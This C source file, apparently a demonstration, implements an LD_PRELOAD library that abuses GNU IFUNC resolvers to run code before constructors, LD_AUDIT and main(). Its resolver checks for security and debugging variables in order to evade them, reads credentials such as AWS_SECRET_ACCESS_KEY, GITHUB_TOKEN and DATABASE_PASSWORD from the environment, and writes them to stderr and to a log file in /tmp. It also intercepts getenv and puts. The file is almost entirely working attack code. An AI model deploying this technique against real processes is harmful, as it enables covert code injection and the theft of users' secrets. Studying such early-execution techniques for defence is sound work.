/*
 * resolver_attack.c - IFUNC Resolver Attack Demonstration
 *
 * This demonstrates the ULTIMATE early code execution:
 * IFUNC resolvers run during dynamic linking, before:
 *   - LD_PRELOAD constructors
 *   - LD_AUDIT la_preinit
 *   - Library constructors
 *   - Program constructors
 *   - main()
 *
 * The resolver is literally called as part of symbol resolution,
 * making it the earliest possible user-space code execution point.
 *
 * Attack capabilities demonstrated:
 *   1. Execute code before ANY other hooks
 *   2. Steal environment variables before sanitization
 *   3. Detect and evade security tools
 *   4. Establish persistence before defenses initialize
 *
 * Usage:
 *   LD_PRELOAD=./libresolver_attack.so ./target
 *
 * EDUCATIONAL PURPOSES ONLY
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <pwd.h>

/* Color codes */
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN    "\033[1;36m"
#define RESET   "\033[0m"

#define LOG_FILE "/tmp/resolver_attack.log"

/* ═══════════════════════════════════════════════════════════════════════════
 * ATTACK PAYLOAD - RUNS IN RESOLVER (EARLIEST POSSIBLE)
 * ═══════════════════════════════════════════════════════════════════════════ */

static int attack_executed = 0;
static FILE *attack_log = NULL;

/* Direct write - safe to call before libc is initialized */
static void early_write(const char *msg) {
    write(STDERR_FILENO, msg, strlen(msg));
}

/* Direct getenv using environ - safe before libc */
extern char **environ;
static char *early_getenv(const char *name) {
    size_t len = strlen(name);
    for (char **env = environ; *env; env++) {
        if (strncmp(*env, name, len) == 0 && (*env)[len] == '=') {
            return *env + len + 1;
        }
    }
    return NULL;
}

/*
 * THE ATTACK FUNCTION
 *
 * This runs during symbol resolution - THE EARLIEST POINT
 * Even LD_AUDIT's la_preinit runs AFTER this!
 */
static void execute_attack(void) {
    if (attack_executed) return;
    attack_executed = 1;

    /* Banner */
    early_write("\n");
    early_write(RED "╔════════════════════════════════════════════════════════════════════╗\n" RESET);
    early_write(RED "║" YELLOW "        ★ IFUNC RESOLVER ATTACK - EARLIEST EXECUTION ★            " RED "║\n" RESET);
    early_write(RED "║" RESET "                                                                    " RED "║\n" RESET);
    early_write(RED "║" RESET "  Running during symbol resolution - before EVERYTHING else!        " RED "║\n" RESET);
    early_write(RED "║" RESET "  Earlier than: constructors, LD_AUDIT la_preinit, main()          " RED "║\n" RESET);
    early_write(RED "╚════════════════════════════════════════════════════════════════════╝\n" RESET);
    early_write("\n");

    /* Open log file */
    attack_log = fopen(LOG_FILE, "w");
    if (attack_log) {
        fprintf(attack_log, "═══════════════════════════════════════════════════════\n");
        fprintf(attack_log, "IFUNC RESOLVER ATTACK LOG\n");
        fprintf(attack_log, "PID: %d\n", getpid());
        fprintf(attack_log, "═══════════════════════════════════════════════════════\n\n");
    }

    /* Reconnaissance */
    early_write(CYAN "  [*] Early Reconnaissance:\n" RESET);

    /* Get executable */
    char exe[256] = {0};
    ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (len > 0) {
        exe[len] = '\0';
        char buf[512];
        snprintf(buf, sizeof(buf), "      Executable: %s\n", exe);
        early_write(buf);
        if (attack_log) fprintf(attack_log, "[RECON] Executable: %s\n", exe);
    }

    /* Get user info */
    char buf[256];
    snprintf(buf, sizeof(buf), "      UID: %d, EUID: %d\n", getuid(), geteuid());
    early_write(buf);
    if (attack_log) fprintf(attack_log, "[RECON] UID: %d, EUID: %d\n", getuid(), geteuid());

    early_write("\n");

    /* Security detection - be careful with environ access */
    early_write(CYAN "  [*] Security Tool Detection:\n" RESET);

    if (environ) {
        const char *security_vars[] = {
            "LD_AUDIT",
            "LD_DEBUG",
            "MALLOC_CHECK_",
            "ASAN_OPTIONS",
            NULL
        };

        int detected = 0;
        for (int i = 0; security_vars[i]; i++) {
            char *val = early_getenv(security_vars[i]);
            if (val) {
                snprintf(buf, sizeof(buf), RED "      [!] %s detected\n" RESET, security_vars[i]);
                early_write(buf);
                if (attack_log) fprintf(attack_log, "[SECURITY] %s = %s\n", security_vars[i], val);
                detected = 1;
            }
        }

        if (!detected) {
            early_write(GREEN "      No security tools detected\n" RESET);
        }
    } else {
        early_write(YELLOW "      (environ not available yet)\n" RESET);
    }

    early_write("\n");

    /* Steal secrets */
    early_write(CYAN "  [*] Capturing Secrets (before any sanitization):\n" RESET);

    if (environ) {
        const char *secrets[] = {
            "SECRET_API_KEY",
            "DATABASE_PASSWORD",
            "AWS_SECRET_ACCESS_KEY",
            "AUTH_TOKEN",
            "GITHUB_TOKEN",
            NULL
        };

        int found = 0;
        for (int i = 0; secrets[i]; i++) {
            char *val = early_getenv(secrets[i]);
            if (val) {
                snprintf(buf, sizeof(buf), RED "      [STOLEN] %s = %s\n" RESET, secrets[i], val);
                early_write(buf);
                if (attack_log) fprintf(attack_log, "[STOLEN] %s = %s\n", secrets[i], val);
                found = 1;
            }
        }
        if (!found) {
            early_write(YELLOW "      No secrets found in environment\n" RESET);
        }
    } else {
        early_write(YELLOW "      (environ not available yet)\n" RESET);
    }

    early_write("\n");

    if (attack_log) fflush(attack_log);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * IFUNC HOOKS
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Real function pointers */
static char *(*real_getenv)(const char *) = NULL;
static int (*real_puts)(const char *) = NULL;

/* Hook implementations */
static char *hooked_getenv(const char *name) {
    if (!real_getenv) real_getenv = dlsym(RTLD_NEXT, "getenv");
    return real_getenv(name);
}

static int hooked_puts(const char *s) {
    if (!real_puts) real_puts = dlsym(RTLD_NEXT, "puts");
    /* Prefix to show interception */
    fprintf(stderr, BLUE "[INTERCEPTED] " RESET);
    return real_puts(s);
}

/* Resolvers - attack executes here */
static void *getenv_resolver(void) {
    execute_attack();  /* ATTACK RUNS HERE! */
    return hooked_getenv;
}

static void *puts_resolver(void) {
    /* Attack already executed by getenv_resolver */
    return hooked_puts;
}

/* IFUNC declarations */
char *getenv(const char *name) __attribute__((ifunc("getenv_resolver")));
int puts(const char *s) __attribute__((ifunc("puts_resolver")));

/* ═══════════════════════════════════════════════════════════════════════════
 * CONSTRUCTOR - Runs AFTER resolvers
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((constructor))
static void constructor_check(void) {
    fprintf(stderr, YELLOW "  [CONSTRUCTOR] " RESET "Running after resolvers\n");
    fprintf(stderr, "      Attack already executed: %s\n\n",
            attack_executed ? GREEN "YES" RESET : RED "NO" RESET);

    if (attack_log) {
        fprintf(attack_log, "[CONSTRUCTOR] Constructor running after resolvers\n");
        fflush(attack_log);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * DESTRUCTOR
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((destructor))
static void attack_fini(void) {
    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "           ★ RESOLVER ATTACK SESSION COMPLETE ★                   " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  Log: " BLUE LOG_FILE RESET "                                " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");

    if (attack_log) {
        fprintf(attack_log, "\n[+] Session complete\n");
        fclose(attack_log);
    }
}
